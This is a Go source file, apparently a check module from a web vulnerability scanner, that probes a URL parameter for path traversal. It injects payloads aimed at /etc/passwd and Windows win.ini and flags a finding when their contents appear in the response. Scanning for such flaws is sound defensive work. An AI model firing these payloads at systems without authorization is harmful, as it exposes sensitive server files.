package checks

import (
	"context"
	"net/url"
	"strings"

	"github.com/RodKast/Vex/pkg/types"
)

type PathTraversalCheck struct{}

func (p *PathTraversalCheck) Name() string {
	return "Path Traversal"
}

func (p *PathTraversalCheck) Run(ctx context.Context, point types.InjectionPoint,
	eng types.RequestDoer) []types.Finding {

	payloads := []string{
		"../../../../etc/passwd",
		"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
		"..\\..\\..\\..\\windows\\win.ini",
	}

	for _, payload := range payloads {
		parsed, err := url.Parse(point.URL)
		if err != nil {
			continue
		}
		params := parsed.Query()
		params.Set(point.Parameter, payload)
		parsed.RawQuery = params.Encode()
		injectedURL := parsed.String()

		resp := eng.Do(ctx, types.Request{
			URL:    injectedURL,
			Method: point.Method,
		})
		if resp.Error != nil {
			continue
		}

		if strings.Contains(string(resp.Body), "root:") || strings.Contains(string(resp.Body), "[extensions]") {
			return []types.Finding{{
				Title:       "Path Traversal",
				URL:         point.URL,
				Parameter:   point.Parameter,
				Severity:    "high",
				Description: "Parameter allows directory traversal, exposing sensitive files",
				Evidence:    payload,
				Confirmed:   true,
			}}
		}
	}
	return nil
}

func init() {
	Register(&PathTraversalCheck{})
}
